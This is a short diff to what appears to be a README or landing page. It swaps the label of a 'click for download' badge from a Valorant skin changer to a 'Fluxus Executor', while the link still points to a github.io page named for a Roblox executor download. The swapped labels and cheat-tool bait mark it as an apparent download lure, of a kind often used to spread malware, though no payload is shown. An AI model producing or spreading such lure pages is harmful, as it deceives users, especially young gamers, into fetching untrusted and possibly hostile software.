@@ -2,7 +2,7 @@
 
 <div style="text-align: center">
   <a href="https://delta-roblox-executor-pc-download.github.io/.github/">
-    <img class="bumbum" style="width: 600px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Valorant_Skin_Changer-blueviolet">
+    <img class="bumbum" style="width: 600px" alt="Static Badge" src="https://img.shields.io/badge/click_for_download-Fluxus_Executor-blueviolet">
   </a>
 </div>
 
